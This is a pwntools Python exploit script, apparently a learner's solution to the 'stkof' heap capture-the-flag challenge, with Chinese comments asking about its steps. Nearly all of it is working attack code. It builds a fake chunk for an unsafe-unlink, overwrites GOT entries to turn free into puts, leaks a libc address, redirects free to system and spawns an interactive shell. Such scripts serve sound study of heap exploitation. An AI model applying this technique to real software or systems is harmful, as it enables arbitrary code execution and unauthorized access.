# -*- coding:utf-8 -*-
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'

# r = remote('52.68.31.117', 9547)
r = process('./stkof')

libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
stkof = ELF("./stkof")
print(str(r.proc.pid))

def alloc(s):
    # r.recvuntil('OK')
    r.sendline('1')
    r.sendline(str(s))
    res = r.recvuntil('OK\n')
    num = int(res.strip().split('\n')[0])
    print("alloc num: ", num)
    return num

def fill(num, value):
    r.sendline('2')
    r.sendline(str(num))
    r.sendline(str(len(value)))
    r.send(value) # 
    res = r.recvuntil('OK\n')
    print('fill content: ', res)


def de(num):
    r.sendline('3')
    r.sendline(str(num))
    # res = r.recvuntil('OK\n')
    # return res





alloc(0x80)
alloc(0x80)
alloc(0x80)
# alloc(0x80)
fill(1, 'A'*10)
fill(2, 'A'*10)
fill(3, 'A'*10)
# fill(4, 'A'*10)
# print(str(r.proc.pid),"before de 1");pause()
# de(1) #0xe06010
# print(str(r.proc.pid),"before de 2");pause()
# de(2) #0xe064b0 (size : 0x90) <--> 0xe06010 (size : 0x90)
# print(str(r.proc.pid),"before de 3");pause()
# de(3) #0xe064b0 (size : 0x120) <--> 0xe06010 (size : 0x90) 
# 所以2，3是相邻块
# de()
# ??这里使用0x40的fake块不行，为什么？
target = 0x602140 + 0x10 #怎么找到的？？，这里存着chunk2的地址
payload = ''
payload += 1 * p64(0x44)
payload += p64(0x81) ## fake len
payload += p64(target-0x18) + p64(target-0x10)
payload += 12 * p64(0x44)
payload += p64(0x80)
payload += p64(0x90)
fill(2, payload)

print(str(r.proc.pid),"before de 3");pause()
de(3) # 1. setup 
r.recvuntil('OK\n')
# stkof.got["free"]
# stkof.plt["puts"]
# libc.symbols["puts"]
payload = ''
payload = 2 * p64(0x0)
payload += p64(stkof.got['atoi'])
payload += p64(stkof.got['free'])
fill(2, payload) # 2. overrite
# print('puts@plt: ', hex(stkof.plt['puts']))

# value = p64(stkof.plt['puts'])
# r.sendline('2')
# r.sendline('1')
# r.sendline(str(len(value)))
# r.sendline(value)
# r.recv()
fill(2, p64(stkof.plt['puts']))

alloc(100)
# fill(4, p64(stkof.got['puts']))
# de(4) # how to print this unprint??
de(1)
res = r.recv(6).ljust(8, '\x00')
r.recv(timeout=0.01)
# leak = u64(res)
libc_base = u64(res) - libc.symbols["atoi"]
system = libc_base + libc.symbols["system"]
print("leak libc: ", hex(u64(res)), hex(libc_base))


fill(2, p64(system)) # 这里为什么不用system&plt??


alloc(0x80)
fill(5, "/bin/sh")

de(5)



print(str(r.proc.pid))

r.interactive()


